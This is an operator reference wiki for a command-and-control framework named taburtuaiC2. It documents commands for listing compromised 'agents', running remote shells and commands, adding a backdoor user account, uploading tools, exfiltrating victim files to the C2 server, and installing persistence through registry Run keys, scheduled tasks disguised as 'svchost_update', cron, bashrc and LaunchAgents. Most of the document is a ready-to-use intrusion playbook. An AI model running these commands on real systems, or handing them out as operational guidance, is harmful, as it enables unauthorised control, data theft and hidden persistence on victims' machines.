# taburtuaiC2 — Operator CLI Wiki

> Reference for all CLI commands. Keep this file updated when new commands are added.

---

## Contents

- [Setup](#setup)
- [Global Flags](#global-flags)
- [agents](#agents)
- [shell](#shell)
- [cmd](#cmd)
- [status](#status)
- [history](#history)
- [files](#files)
- [process](#process)
- [persistence](#persistence)
- [queue](#queue)
- [logs](#logs)
- [stats](#stats)
- [version](#version)

---

## Setup

```bash
# Run directly (no build required)
go run ./cmd/operator --server http://<C2_IP>:<PORT> <command>

# Or build once and run binary
go build -o bin/operator ./cmd/operator
./bin/operator --server http://<C2_IP>:<PORT> <command>

# Set server via environment variable (avoids --server on every command)
export TABURTUAI_SERVER=http://172.23.0.118:9000
go run ./cmd/operator agents list
```

---

## Global Flags

| Flag | Env var | Description |
|------|---------|-------------|
| `--server URL` | `TABURTUAI_SERVER` | C2 server address |
| `--api-key KEY` | `TABURTUAI_API_KEY` | Bearer token (if auth enabled on server) |
| `--timeout SEC` | — | HTTP request timeout (default: 30s) |
| `--verbose` | — | Show debug output |

**Agent ID shorthand**: All commands that take `<agent-id>` also accept a short prefix (e.g. `7d019eb7`). The CLI resolves it to the full UUID automatically.

---

## agents

Manage and inspect connected agents.

### `agents list`

List all agents and their current status.

```bash
operator agents list
```

**Output columns**: ID · Hostname · Username · OS · Status · Last Seen

**Status values**:

| Status | Meaning |
|--------|---------|
| `online` | Beaconed within dormant window (default 10 min) |
| `dormant` | No beacon for 10–30 min — commands still queueable |
| `offline` | No beacon for >30 min — commands rejected |

### `agents info <agent-id>`

Show detailed info for a single agent.

```bash
operator agents info 7d019eb7
```

### `agents delete <agent-id>`

Remove an agent record from the server.

```bash
operator agents delete 7d019eb7
```

---

## shell

Start an interactive shell session with an agent.

```bash
operator shell <agent-id>
```

```bash
operator shell 7d019eb7
```

- Type commands and press Enter — output appears after the next agent beacon
- Type `exit` or `quit`, or press `Ctrl+D` to end the session
- Beacon interval affects response latency (default 10s; up to 12s with 20% jitter)

**Example session**:

```
  shell  7d019eb7  · exit to quit

[7d019eb7] › whoami
blackout\nurkh
[7d019eb7] › ipconfig /all
...
[7d019eb7] › exit
```

---

## cmd

Execute a single command on an agent (non-interactive).

```bash
operator cmd execute <agent-id> "<command>" [flags]
```

| Flag | Default | Description |
|------|---------|-------------|
| `--timeout SEC` | `60` | Max seconds to wait for result |
| `--workdir PATH` | — | Working directory on agent |
| `--background` | `false` | Queue and return immediately (don't wait) |

**Examples**:

```bash
# Simple command
operator cmd execute 7d019eb7 "whoami"

# With working directory
operator cmd execute 7d019eb7 "dir" --workdir "C:\Users\nurkh\Documents"

# Fire and forget
operator cmd execute 7d019eb7 "net user hacker P@ssw0rd /add" --background
```

---

## status

Check the status and output of any previously queued command.

```bash
operator status <command-id>
```

```bash
operator status 5ba1dcad-5705-42bd-becd-3a749884216f
```

**Status values**: `pending` · `in_progress` · `completed` · `failed` · `timeout`

---

## history

Show command execution history for an agent.

```bash
operator history <agent-id> [flags]
```

| Flag | Default | Description |
|------|---------|-------------|
| `--limit N` | `20` | Number of entries to show |
| `--status STATUS` | — | Filter by status (completed/failed/pending) |

```bash
operator history 7d019eb7 --limit 50
operator history 7d019eb7 --status failed
```

---

## files

Transfer files between the operator and an agent via the C2 server.

### `files upload <agent-id> <local-file> <remote-path>`

Upload a local file to the agent.

```bash
operator files upload 7d019eb7 /tmp/tool.exe "C:\Windows\Temp\tool.exe"
```

| Flag | Default | Description |
|------|---------|-------------|
| `--wait` | `false` | Wait for agent to confirm the file was written |

### `files download <agent-id> <remote-file> <local-path>`

Download a file from the agent to the C2 server.

```bash
operator files download 7d019eb7 "C:\Users\nurkh\secret.txt" /tmp/secret.txt
```

| Flag | Default | Description |
|------|---------|-------------|
| `--wait` | `false` | Wait for agent to exfiltrate the file |

> **Note**: The file lands on the C2 server, not the operator machine. Retrieve it from the server separately if running remotely.

---

## process

Manage processes on an agent.

### `process list <agent-id>`

List running processes on the agent.

```bash
operator process list 7d019eb7
```

| Flag | Default | Description |
|------|---------|-------------|
| `--wait` | `false` | Wait for output before returning |

### `process kill <agent-id> [flags]`

Kill a process by PID or name.

```bash
operator process kill 7d019eb7 --pid 1234
operator process kill 7d019eb7 --name notepad.exe
```

| Flag | Description |
|------|-------------|
| `--pid N` | Process ID to kill |
| `--name NAME` | Process name to kill |
| `--wait` | Wait for confirmation |

### `process start <agent-id> <process-path> [flags]`

Start a new process on the agent. The process path is a positional argument.

```bash
operator process start 7d019eb7 "C:\Windows\System32\cmd.exe"
operator process start 7d019eb7 "powershell.exe" --args "-NoProfile -Command whoami"
operator process start 7d019eb7 "notepad.exe" --wait
```

| Flag | Description |
|------|-------------|
| `--args ARGS` | Arguments string passed to the process |
| `--wait` | Wait for output before returning |

---

## persistence

Install or remove persistence mechanisms on an agent.

### `persistence setup <agent-id> [flags]`

Install persistence so the agent survives reboots.

```bash
operator persistence setup <agent-id> --method <method> [flags]
```

| Flag | Default | Description |
|------|---------|-------------|
| `--method METHOD` | — | Persistence method (required, see table below) |
| `--name NAME` | auto-generated | Registry key / task / service name |
| `--path PATH` | — | Path to the executable to persist (required) |
| `--args ARGS` | — | Arguments passed to the executable |
| `--wait` | `false` | Wait for agent to confirm |

**Available methods**:

| OS | Method | Description |
|----|--------|-------------|
| Windows | `registry_run` | HKCU\...\Run registry key |
| Windows | `schtasks_onlogon` | Scheduled task triggered on user logon |
| Windows | `schtasks_daily` | Daily scheduled task |
| Windows | `startup_folder` | Copy to startup folder |
| Linux | `cron_reboot` | `@reboot` cron entry |
| Linux | `systemd_user` | Systemd user service |
| Linux | `bashrc` | Append to `~/.bashrc` |
| macOS | `launchagent` | LaunchAgent plist in `~/Library/LaunchAgents/` |

**Short aliases**: `registry`/`reg` → `registry_run`, `task`/`schtask` → `schtasks_onlogon`, `startup` → `startup_folder`, `cron` → `cron_reboot`, `systemd`/`service` → `systemd_user`, `bash` → `bashrc`, `launch`/`plist` → `launchagent`

**Examples**:

```bash
# Windows — registry (uses agent's own path by default)
operator persistence setup 7d019eb7 --method registry_run

# Windows — scheduled task with custom name, wait for result
operator persistence setup 7d019eb7 --method schtasks_onlogon --name svchost_update --wait

# Linux — cron reboot with explicit path
operator persistence setup 7d019eb7 --method cron_reboot --path /tmp/.agent
```

### `persistence remove <agent-id> [flags]`

Remove a previously installed persistence entry.

```bash
operator persistence remove <agent-id> --method <method> --name <name>
```

| Flag | Description |
|------|-------------|
| `--method METHOD` | Same method used during setup (required) |
| `--name NAME` | Same name used during setup (required) |
| `--wait` | Wait for agent to confirm removal |

```bash
operator persistence remove 7d019eb7 --method registry_run --name svchost_update
```

---

## queue

Manage the pending command queue for an agent.

### `queue stats`

Show queue statistics for all agents.

```bash
operator queue stats
```

### `queue clear <agent-id>`

Remove all pending (not yet executed) commands for an agent.

```bash
operator queue clear 7d019eb7
```

---

## logs

Fetch server-side logs.

```bash
operator logs [flags]
```

| Flag | Default | Description |
|------|---------|-------------|
| `--limit N` | `50` | Number of log entries to return |
| `--level LEVEL` | — | Filter by level: `DEBUG`/`INFO`/`WARN`/`ERROR` |

```bash
operator logs --limit 100 --level WARN
```

---

## stats

Show server health and statistics.

```bash
operator stats
```

**Shows**: uptime · total agents · online/dormant/offline counts · command queue depth · total commands executed.

---

## version

Print CLI version.

```bash
operator version
```

---

## Quick Reference

```
agents list                              — list all agents
agents info <id>                         — agent details
shell <id>                               — interactive shell
cmd execute <id> "<cmd>"                 — single command
status <cmd-id>                          — check command result
history <id>                             — command history
files upload <id> <local> <remote>       — upload file to agent
files download <id> <remote> <local>     — download file from agent
process list <id>                        — list processes
process kill <id> --pid <n>              — kill process
process start <id> <exe> [--args "..."]  — start process
persistence setup <id> --method <m>      — install persistence
persistence remove <id> --method <m> --name <n>  — remove persistence
queue stats                              — queue overview
queue clear <id>                         — clear pending queue
logs                                     — server logs
stats                                    — server statistics
```
